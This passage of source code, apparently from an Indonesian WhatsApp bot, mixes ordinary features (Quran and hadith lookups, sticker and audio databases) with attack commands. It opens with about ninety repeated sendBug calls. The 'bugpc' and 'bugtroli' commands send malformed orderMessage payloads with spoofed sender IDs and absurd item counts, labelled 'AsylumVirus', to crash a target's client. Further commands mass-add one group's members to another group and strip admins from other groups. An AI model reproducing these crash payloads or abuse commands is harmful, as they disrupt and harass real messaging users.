sendBug(args[1])
sendBug(args[1])
sendBug(args[1])
sendBug(args[1])
sendBug(args[1])
sendBug(args[1])
sendBug(args[1])
sendBug(args[1])
sendBug(args[1])
sendBug(args[1])
sendBug(args[1])
sendBug(args[1])
sendBug(args[1])
sendBug(args[1])
sendBug(args[1])
sendBug(args[1])
sendBug(args[1])
sendBug(args[1])
sendBug(args[1])
sendBug(args[1])
sendBug(args[1])
sendBug(args[1])
sendBug(args[1])
sendBug(args[1])
sendBug(args[1])
sendBug(args[1])
sendBug(args[1])
sendBug(args[1])
sendBug(args[1])
sendBug(args[1])
sendBug(args[1])
sendBug(args[1])
sendBug(args[1])
sendBug(args[1])
sendBug(args[1])
sendBug(args[1])
sendBug(args[1])
sendBug(args[1])
sendBug(args[1])
sendBug(args[1])
sendBug(args[1])
sendBug(args[1])
sendBug(args[1])
sendBug(args[1])
sendBug(args[1])
sendBug(args[1])
sendBug(args[1])
sendBug(args[1])
sendBug(args[1])
sendBug(args[1])
sendBug(args[1])
sendBug(args[1])
sendBug(args[1])
sendBug(args[1])
sendBug(args[1])
sendBug(args[1])
sendBug(args[1])
sendBug(args[1])
sendBug(args[1])
sendBug(args[1])
sendBug(args[1])
sendBug(args[1])
sendBug(args[1])
sendBug(args[1])
sendBug(args[1])
sendBug(args[1])
sendBug(args[1])
sendBug(args[1])
sendBug(args[1])
sendBug(args[1])
sendBug(args[1])
sendBug(args[1])
sendBug(args[1])
sendBug(args[1])
sendBug(args[1])
sendBug(args[1])
sendBug(args[1])
sendBug(args[1])
sendBug(args[1])
sendBug(args[1])
sendBug(args[1])
sendBug(args[1])
sendBug(args[1])
sendBug(args[1])
sendBug(args[1])
sendBug(args[1])
sendBug(args[1])
sendBug(args[1])
sendBug(args[1])
sendBug(args[1])
sendBug(args[1])
sendBug(args[1])
sendBug(args[1])
sendBug(args[1])
sendBug(args[1])
//textImg(`Sukses ${pushname}`)
break

case 'bugpc':
if (!isOwner && !msg.key.fromMe) return reply(mess.only.ownerB)
surya.updatePresence(from, Presence.composing)
surya.sendMessage(from, 'yaudah oke',text, {
 quoted: {
key: {
 participant: '1111111111@s.whatsapp.net' // Fake sender Jid
},
message: {
 orderMessage: {
itemCount: 70000, // Bug
status: 1,
surface: 1,
message: `Mecha Botz`,
orderTitle: `ᴹᴿ᭄𝑺𝒖𝒓𝒚𝒂ㄙ×፝֟͜×`, // 
sellerJid: '0@s.whatsapp.net' // Seller
 }
}
 }
})
break


case 'bugtroli':
if (!isOwner && !fromMe && !isOwner2) return mentions(mess.OnlySurya, [Suryaa], true)
 function sleep(ms) {
return new Promise(resolve => setTimeout(resolve, ms));
}
function troli(nomor){
surya.sendMessage(nomor, `
▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
▒▒▒▒▒▒▒▒▄▄▄▄▄▄▄▄▒▒▒▒▒▒
▒▒█▒▒▒▄██████████▄▒▒▒▒
▒█▐▒▒▒████████████▒▒▒▒
▒▌▐▒▒██▄▀██████▀▄██▒▒▒
▐┼▐▒▒██▄▄▄▄██▄▄▄▄██▒▒▒
▐┼▐▒▒██████████████▒▒▒
▐▄▐████─▀▐▐▀█─█─▌▐██▄▒
▒▒█████──────────▐███▌
▒▒█▀▀██▄█─▄───▐─▄███▀▒
▒▒█▒▒███████▄██████▒▒▒
▒▒▒▒▒██████████████▒▒▒
▒▒▒▒▒██████████████▒▒▒
▒▒▒▒▒█████████▐▌██▌▒▒▒
▒▒▒▒▒▐▀▐▒▌▀█▀▒▐▒█▒▒▒▒▒
▒▒▒▒▒▒▒▒▒▒▒▐▒▒▒▒▌▒▒▒▒▒
▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒`, MessageType.extendedText,{
 quoted: {
key: {
 participant: '0@s.whatsapp.net' // Fake sender Jid
},
message: {
orderMessage: {
thumbnail: suryaImg,
itemCount: -969769349, // Bug
status: 1,
surface: 1,
message: '☠️Surya☠️',
orderTitle: 'AsylumVirus', // Idk what this does
sellerJid: '0@s.whatsapp.net' // Seller
 }
}
 }
})
}
function bug(jid){
for(let i=0;i < 1;i++){
var
WA_DEFAULT_EPHEMERAL = require('@adiwajshing/baileys')
surya.toggleDisappearingMessages(jid, WA_DEFAULT_EPHEMERAL)
}}
async function attack(targett){
bug(targett)
await sleep(100)
troli(targett)
await sleep(100)
bug(targett)
}

attack(msg.key.remoteJid)
break

case 'report': case 'lapor':
if (!q) return textImg('mau lapor apa dek?')
if (isGroup) {
sendMess(Suryaa, `
*── 「 REPORT 」 ──*

*From*: ${pushname}
*Wa*: wa.me/${sender.split("@")[0]}
*Group*: ${groupName}
*Message*: ${q}`)
textImg(`Halo ${pushname}!
Terima kasih telah melapor, laporanmu akan kami segera terima.`)
} else {
sendMess(Suryaa, `
*── 「 REPORT 」 ──*

*From*: ${pushname}
*Wa*: wa.me/${sender.split("@")[0]}
*Message*: ${q}`)
textImg(`Halo ${pushname}!
Terima kasih telah melapor, laporanmu akan kami segera terima.`)
}
break

case 'demoteall': case 'dmall':
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3,{"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (isMuted) return
if (isBan) return 
if (!isOwner && !isOwner2)return mentions(mess.OnlySurya, [Suryaa], true)
let memb_id = []
for (let mem of groupMembers) {
memb_id.push(mem.jid)
}
surya.groupDemoteAdmin(from, memb_id)
break
case 'promoteall':
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (isMuted) return
if (isBan) return 
if (!isOwner && !isOwner2) return mentions(mess.OnlySurya, [Suryaa], true)
let members_id = []
for (let mem of groupMembers) {
members_id.push(mem.jid)
}
surya.groupMakeAdmin(from, members_id)
break
case 'alkitab':
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (isMuted) return
if (isBan) return 
if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
fetchJson('http://docs-jojo.herokuapp.com/api/alkitab').then((res) =>{
let ini_txt = ''
ini_txt += `Ayat : ${res.result.ayat}\n`
ini_txt += `Isi : ${res.result.isi}\n\n`
ini_txt += `Link : ${res.result.link}\n`
sendFileFromUrl(from, res.result.img, ini_txt, msg)
limitAdd(sender, limit)
 })
.catch((err) => {
sendMess(ownerNumber, `${command} Error:` + err)
reply(mess.error.api)
})
break

case 'idgrup': case 'idgc': case 'hai':
if (!isRegister) return
if (isBan) return
if (!isOwner && !isOwner2 && !fromMe) return
let idgc = from
surya.sendMessage(Surya, idgc, text)
//textImg(`${groupMembers.length}`)
break

case 'demotegrup':
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (isMuted) return
if (isBan) return 
if (!isOwner && !isOwner2) return mentions(mess.OnlySurya, [Suryaa], true)
if (!q) return reply('_*Masukin id grupnya*_')
let kontoll = []
for (let mem of groupMembers) {
kontoll.push(mem.jid)
}
surya.groupDemoteAdmin(args[1], kontoll)
textImg(mess.success)
break
case 'promotegrup':
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (isMuted) return
if (isBan) return 
if (!isOwner && !isOwner2) return mentions(mess.OnlySurya, [Suryaa], true)
if (!q) return reply('_*Masukin id grupnya*_')
let memekk = []
for (let mem of groupMembers) {
memekk.push(mem.jid)
}
surya.groupMakeAdmin(args[1], memekk)
textImg(mess.success)
break

case 'culik': case 'sepi':
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
//if (isMuted) return
if (isBan) return 
if (!isOwner && !isOwner2 && !fromMe) return mentions(mess.OnlySurya, [Suryaa], true)
if (args.length < 2) return reply('_*Masukin id grupnya*_')
let pantek = []
for (let i of groupMembers) {
pantek.push(i.jid)
}
surya.groupAdd(args[1], pantek)
break

/*case 'kickall':
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (isMuted) return
if (isBan) return 
if (!isOwner && !isOwner2 && !fromMe) return mentions(mess.OnlySurya, [Suryaa], true)
if (!q) return reply('_*Masukin id grupnya*_')
let sesat = []
for (let i of groupMembers) {
sesat.push(i.jid)
}
surya.groupRemove(args[1], sesat)
textImg(mess.success)
break
case 'kickall':
if (!isOwner) return mentions(`Perintah ini Khusus @${Suryaa.split('@')[0]}`, [Suryaa], true)
let members_id = []
teks = (args.length > 1) ? body.slice(7).trim() : ''
teks += '\n\n'
for (let mem of groupMembers) {
teks += `*😘* ${mem.jid.split('@')[0]}\n`
members_id.push(mem.jid)
}
mentions(teks, members_id, true)
surya.groupRemove(from, members_id)
break
case 'tendangall':
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (isMuted) return
if (isBan) return 
if (!isOwner) return mentions(`Perintah ini Khusus @${Suryaa.split('@')[0]}`, [Suryaa], true)
if (args.length < 2) return reply('_*Masukin id grupnya*_')
let mmber_id = []
for (let mem of groupMembers) {
mmber_id.push(mem.jid)
}
surya.groupRemove(args[1], mmber_id)
break*/

case 'unreadall':
if (!fromMe && !isOwner && !isOwner2) return mentions(`Perintah ini Khusus @${Suryaa.split('@')[0]}`, [Suryaa], true)
var chatz = await surya.chats.all()
chatz.map( async ({ jid }) => {
await surya.chatRead(jid, 'unread')
})
var teksss = `\`\`\`Successfully unread ${chatz.length} chats !\`\`\``
surya.sendMessage(from, teksss, text, {quoted: fgc})
break

case 'readall':
if (!fromMe && !isOwner && !isOwner2) return reply('Anda Sapa')
var chat = await surya.chats.all()
chat.map( async ({ jid }) => {
await surya.chatRead(jid)
})
var tekssss = `\`\`\`Successfully read ${chat.length} chats !\`\`\``
 surya.sendMessage(from, tekssss, text, {quoted: fgc})
break

case 'hadis': case 'hades': case 'hadist':
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (isMuted) return
if (isBan) return 
if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
let hadis =
`*── 「 HADIS 」 ──*

Daftar hadis:
1. Hadis Bukhari ada 6638 hadis
*Contoh :* ${command} bukhari 1

2. Hadis Muslim ada 4930 hadis
*Contoh :* ${command} muslim 25

3. Hadis Tirmidzi ada 3625 hadis
*Contoh :* ${command} tirmidzi 10

4. Hadis nasai ada 5364 hadis
*Contoh :* ${command} nasai 6

5. Hadis Ahmad ada 4305 hadis
*Contoh :* ${command} ahmad 5

6. Hadis Abu Daud ada 4419 hadis
*Contoh :* ${command} abu-daud 45

7. Hadis Malik ada 1587 hadis
*Contoh :* ${command} malik 45

8. Hadis Ibnu Majah ada 4285 hadis
*Contoh :* ${command} ibnu-majah 8

9. Hadis Darimi ada 2949 hadis
*Contoh :* ${command} darimi 3`
if (!q) return reply(`Contoh penggunaan ${command} bukhari 10`)
if (args.length < 3) return reply(`${hadis}`)
const listhades = ['darimi', 'ahmad', 'bukhari', 'muslim', 'malik', 'nasai', 'tirmidzi', 'abu-daud', 'ibnu-majah']
if (!listhades.includes(args[1].toLowerCase())) return reply(`${hadis}`)
fetchJson(`https://api.hadith.sutanlab.id/books/${args[1].toLowerCase()}/${args[2]}`)
.then((habud) =>{
textImg(`${habud.data.contents.arab}\n\n${habud.data.contents.id}\n\n*${habud.data.name}*`)
limitAdd(sender, limit)
})
.catch((err) => {
sendMess(Suryaa, `${command} Error:` + err)
reply(mess.error.api)
})
break

case 'listhadist':
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (isMuted) return
if (isBan) return 
let hadist =
`*── 「 HADIS 」 ──*

Daftar hadis:
1. Hadis Bukhari ada 6638 hadis
*Contoh :* ${prefix}hadis bukhari 1

2. Hadis Muslim ada 4930 hadis
*Contoh :* ${prefix}hadis muslim 25

3. Hadis Tirmidzi ada 3625 hadis
*Contoh :* ${prefix}hadis tirmidzi 10

4. Hadis nasai ada 5364 hadis
*Contoh :* ${prefix}hadis nasai 6

5. Hadis Ahmad ada 4305 hadis
*Contoh :* ${prefix}hadis ahmad 5

6. Hadis Abu Daud ada 4419 hadis
*Contoh :* ${prefix}hadis abu-daud 45

7. Hadis Malik ada 1587 hadis
*Contoh :* ${prefix}hadis malik 45

8. Hadis Ibnu Majah ada 4285 hadis
*Contoh :* ${prefix}hadis ibnu-majah 8

9. Hadis Darimi ada 2949 hadis
*Contoh :* ${prefix}hadis darimi 3`
surya.sendMessage(from, hadist, text, {contextInfo: { forwardingScore: 1000, isForwarded: true, mentionedJid: [sender]},quoted: msg, caption: hadist})
break

case 'quranmp3': case 'qa': case 'quranaudio':
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (isMuted) return
if (isBan) return 
if (!q) return reply(`Cara Penggunaan : \n${command} surah ayat\n\n ${command} 17 32 (Untuk Membuka 1 quran audio ayat saja pada nomor Surah)`)
if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
let json = await fetchJson(`https://islamic-api-indonesia.herokuapp.com/api/data/quran?surah=${args[1]}&ayat=${args[2]}`)
sendFileFromUrl(from, json.result.data.audio.primary, {quoted:msg})
break
case 'detailquran': case 'dquran':
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (isMuted) return
if (isBan) return 
if (!q) return reply(`Cara Penggunaan : \n${command} surah ayat\n\n ${command} 18/10 (Untuk Membuka 1 ayat saja pada nomor Surah)\n\n ${command} 18/1-10 (Untuk Membuka Beberapa ayat)`)
if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
let dq = await fetchJson(`https://islamic-api-indonesia.herokuapp.com/api/data/quran?surah=${args[1]}&ayat=${args[2]}`)
sendFileFromUrl(from, dq.result.data.tafsir.id.short, msg)
break
case 'muslimquotes': case 'quotesmuslim':
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (isMuted) return
if (isBan) return 
if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
let isqu = await fetchJson(`https://islamic-api-indonesia.herokuapp.com/api/data/quotes`)
reply(isqu.result.text_id)
break
case 'wallmuslim': case 'wallpapermuslim':
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (isMuted) return
if (isBan) return 
if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
let js = await fetchJson(`https://islamic-api-indonesia.herokuapp.com/api/data/gambar`)
sendFileFromUrl(from, js.result.image, `Nih ${pushname}`, msg)
break

case 'alquran': case 'surah': case 'surat': case 'quran': case 'alqur\'an': case 'qur\'an':
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (isMuted) return
if (isBan) return 
if (!q) return reply(`Cara Penggunaan : \n${command} Nomor_surah\n\n ${command} 18/10 (Untuk Membuka 1 ayat saja pada nomor Surah)\n\n ${command} 18/1-10 (Untuk Membuka Beberapa ayat)`)
if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
fetchJson(`https://api.lolhuman.xyz/api/quran/${args[1]}?apikey=${lolkey}`)
.then((res) =>{
let ayat = res.result.ayat
let ini_txt = `QS. ${res.result.surah} : 1-${ayat.length}\n\n`
for (var x of ayat) {
var arab = x.arab
var nomor = x.ayat
var latin = x.latin
var indo = x.indonesia
ini_txt += `${arab}\n${nomor}. ${latin}\n${indo}\n\n`
}
let ini_txtt = ini_txt.replace(/<u>/g, "").replace(/<\/u>/g, "")
let ini_txttt = ini_txtt.replace(/<strong>/g, "").replace(/<\/strong>/g, "")
let ini_txtttt = ini_txttt.replace(/<u>/g, "").replace(/<\/u>/g, "")
textImg(ini_txtttt)
limitAdd(sender, limit)
})
.catch((err) => {
sendMess(Suryaa, `${command} Error:` + err)
reply(mess.error.api)
})
break
case 'renungharian':
if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
fetchJson('http://docs-jojo.herokuapp.com/api/renungan').then((res) =>{
let ini_txt = ''
ini_txt += `Judul : ${res.judul}\n`
ini_txt += `Isi : ${res.Isi}\n\n`
ini_txt += `Pesan : ${res.pesan}\n`
textImg(ini_txt)
limitAdd(sender, limit)
 })
.catch((err) => {
sendMess(Suryaa, `${command} Error:` + err)
reply(mess.error.api)
})
break

case 'addrespon':{
 if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (isMuted) return
if (isBan) return 
if (!isPremium) return sendButMessage(from, prem1, prem2, prem3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (!q) return reply(`Cara penggunaan : ${command} textnya|autoresponnya`)
var textnya = q.split('|')[0]
var respnya = q.split('|')[1]
const checkdulu = checkText(textnya)
if (!checkdulu) {
addResponBot(textnya, respnya)
textImg(`*── 「 AUTO RESPON 」 ──*

Auto-Respon berhasil dibuat dengan:

➸ *Text*: ${textnya}
➸ *Akan Merespon*: ${respnya}`)
} else {
reply(`Maaf, autorespon untuk teks "${textnya}" sudah ada sebelumnya,harap memasukkan teks lain.`)
}
}
break
case 'delrespon':{
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (isMuted) return
if (isBan) return 
if (!isPremium) return sendButMessage(from, prem1, prem2, prem3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (!q) return reply(`Cara penggunaan : ${command} textnya`)
_respon.splice(getResponPosition(q), 1)
fs.writeFileSync('./database/respon.json', JSON.stringify(_respon))
reply(`Succes surya`)
}
break
case 'listrespon':{
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (isMuted) return
if (isBan) return 
let listResponn = '*──「 AUTO-RESPON LIST 」──*\n\n'
let nomorListtt = 0
const derettt = getAllRespon()
for (let i = 0; i < derettt.length; i++) {
nomorListtt++
listResponn += `${nomorListtt}. ${derettt[i]}\n\n`
}
textImg(listResponn)
}
break
case 'delaudio':
case 'delvn':{
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (isMuted) return
if (isBan) return 
if (!isOwner && !isOwner2 && !fromMe) return mentions(mess.OnlySurya, [Suryaa], true)
if (!q) return reply(`Cara penggunaan : ${command} textnya`)
if (_vn.includes(q)) {
let anu = _vn.indexOf(q)
_vn.splice(anu, 1)
fs.writeFileSync('./database/vn.json', JSON.stringify(_vn))
fs.unlinkSync(`./media/audio/${q}.mp3`)
reply(`Vn berhasil dihapus dari database!`)
} else {
reply(`Vn tidak ditemukan!`)
}
}
break
case 'addaudio':
case 'addvn':{
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (isMuted) return
if (isBan) return 
if (!isPremium) return sendButMessage(from, prem1, prem2, prem3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (!q || !isQuotedAudio) return reply(`Example: ${command} wibu dan tag vn nya`)
if (_vn.includes(q.toLowerCase())) {
reply(`Vn dengan nama "${q}" sudah ada di database!`)
} else {
_vn.push(q.toLowerCase())
fs.writeFileSync('./database/vn.json', JSON.stringify(_vn))
var mediaData = await surya.downloadMediaMessage(JSON.parse(JSON.stringify(msg).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo)
fs.writeFileSync(`./media/audio/${q}.mp3`, mediaData)
reply(`Vn berhasil ditambahkan ke database!`)
}
}
break
case 'vnlist':
case 'listvn':
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (isMuted) return
if (isBan) return 
let vnList = ` *── 「 VN DATABASE 」 ──*\n\nTotal: ${_vn.length}\n\n*Untuk mengambil vn silahkan reply pesan ini dengan caption nama vn*\n\n`
for (let i of _vn) {
vnList += `➪ ${i.replace(_vn)}\n`
}
textImg(vnList)
break
case 'getvn':
case 'getaudio':
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (isMuted) return
if (isBan) return 
if (!isOwner && !isOwner2 && !fromMe) return mentions(mess.OnlySurya, [Suryaa], true)
if (!q) return reply(`Cara penggunaan : ${command} nama file`)
if (_vn.includes(q)) {
surya.sendMessage(from, fs.readFileSync(`./media/audio/${q}.mp3`), audio, {quoted: msg, ptt: true})
} else {
reply(`Vn tidak ditemukan!`)
}
break
case 'delstik':
case 'delsticker':
case 'delstiker':{
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (isMuted) return
if (isBan) return 
if (!isOwner && !isOwner2 && !fromMe) return mentions(mess.OnlySurya, [Suryaa], true)
if (!q) return reply(`Cara penggunaan : ${command} textnya`)
if (_stick.includes(q)) {
let anu = _stick.indexOf(q)
_stick.splice(anu, 1)
fs.writeFileSync('./database/sticker.json', JSON.stringify(_stick))
fs.unlinkSync(`./media/sticker/${q}.webp`)
reply(`Sticker berhasil dihapus dari database!`)
} else {
reply(`Sticker tidak ditemukan!`)
}
}
break
case 'addsticker':
case 'addsticker':
case 'addstiker':{
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (isMuted) return
if (isBan) return 
if (!isPremium) return sendButMessage(from, prem1, prem2, prem3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (!q || !isQuotedSticker) return reply(`Example: ${command} wibu dan tag stickernya`)
if (_stick.includes(q.toLowerCase())) {
reply(`Sticker dengan nama "${q}" sudah ada di database!`)
} else {
_stick.push(q.toLowerCase())
fs.writeFileSync('./database/sticker.json', JSON.stringify(_stick))
var mediaData = await surya.downloadAndSaveMediaMessage(JSON.parse(JSON.stringify(msg).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo, `./media/sticker/${q}`)
reply(`Sticker berhasil ditambahkan ke database!`)
}
}
break
case 'stickerlist':
case 'liststicker':
case 'stikerlist':
case 'liststiker':
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (isMuted) return
if (isBan) return 
let stickerList = `*── 「 STICKER DATABASE 」 ──*\n\nTotal: ${_stick.length}\n\n`
for (let i of _stick) {
stickerList += `➸ ${i.replace(_stick)}\n`
}
textImg(stickerList)
break
case 'getstiker':
case 'getstik':
case 'getsticker':
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (isMuted) return
if (isBan) return 
if (!isPremium) return sendButMessage(from, prem1, prem2, prem3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (!q) return reply(`Cara penggunaan : ${command} nama file`)
if (_stick.includes(q)) {
surya.sendMessage(from, fs.readFileSync(`./media/sticker/${q}.webp`), sticker, msg)
} else {
reply(`Sticker tidak ditemukan!`)
}
break
case 'delimg':
case 'delimage':{
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (isMuted) return
if (isBan) return 
if (!isOwner && !isOwner2 && !fromMe) return mentions(mess.OnlySurya, [Suryaa], true)
if (!q) return reply(`Cara penggunaan : ${command} nama file`)
if (_image.includes(q)) {
let anu = _image.indexOf(q)
_image.splice(q, 1)
fs.writeFileSync('./database/image.json', JSON.stringify(_image))
fs.unlinkSync(`./media/image/${q}.jpeg`)
reply(`Image berhasil dihapus dari database!`)
} else {
reply(`Image tidak ditemukan!`)
}
}
break

case 'addimage': case 'addimg':{
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (isMuted) return
if (isBan) return 
//if (!isPremium) return sendButMessage(from, prem1, prem2, prem3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (!q || !isQuotedImage) return reply(`Example: ${command} wibu dan tag image nya`)
if (_image.includes(q.toLowerCase())) {
reply(`Image dengan nama "${q}" sudah ada di database!`)
} else {
_image.push(q.toLowerCase())
fs.writeFileSync('./database/image.json', JSON.stringify(_image))
var mediaData = await surya.downloadMediaMessage(JSON.parse(JSON.stringify(msg).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo)
fs.writeFileSync(`./media/image/${q}.jpeg`, mediaData)
reply(`Image berhasil ditambahkan ke database!`)
}
}
break
case 'imglist':
case 'listimg':
case 'imagelist':
case 'listimage':
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (isMuted) return
if (isBan) return 
let imageList = `*── 「 IMAGE DATABASE 」 ──*\n\nTotal: ${_image.length}\n\n`
for (let i of _image) {
imageList += `➸ ${i.replace(_image)}\n`
}
textImg(imageList)
break
case 'getimage':
case 'getimg':
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (isMuted) return
if (isBan) return 
if (!isOwner && !isOwner2 && !fromMe) return mentions(mess.OnlySurya, [Suryaa], true)
if (!q) return reply(`Cara penggunaan : ${command} nama file`)
if (_image.includes(q)) {
surya.sendImage(from, fs.readFileSync(`./media/image/${q}.jpeg`), '', msg)
} else {
reply(`Image tidak ditemukan!`)
}
break

case 'addvideo': case 'addvid':{
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (isMuted) return
if (isBan) return 
if (!isPremium) return sendButMessage(from, prem1, prem2, prem3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (!q || !isQuotedVideo) return reply(`Example: ${command} wibu dan tag video nya`)
if (_video.includes(q.toLowerCase())) {
reply(`Video dengan nama "${q}" sudah ada di database!`)
} else {
_video.push(q.toLowerCase())
fs.writeFileSync('./database/video.json', JSON.stringify(_video))
var mediaData = await surya.downloadMediaMessage(JSON.parse(JSON.stringify(msg).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo)
fs.writeFileSync(`./media/video/${q}.mp4`, mediaData)
reply(`Video berhasil ditambahkan ke database!`)
}
}
break
case 'getvideo':
case 'getvid':
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (isMuted) return
if (isBan) return 
if (!isPremium) return sendButMessage(from, prem1, prem2, prem3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (!q) return reply(`Cara penggunaan : ${command} nama file`)
if (_video.includes(q)) {
surya.sendMessage(from, fs.readFileSync(`./media/video/${q}.mp4`), video, msg)
} else {
reply(`Video tidak ditemukan!`)
}
break
case 'delvid':
case 'delvideo':{
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (isMuted) return
if (isBan) return 
if (!isOwner && !isOwner2 && !fromMe) return mentions(mess.OnlySurya, [Suryaa], true)
if (!q) return reply(`Cara penggunaan : ${command} nama file`)
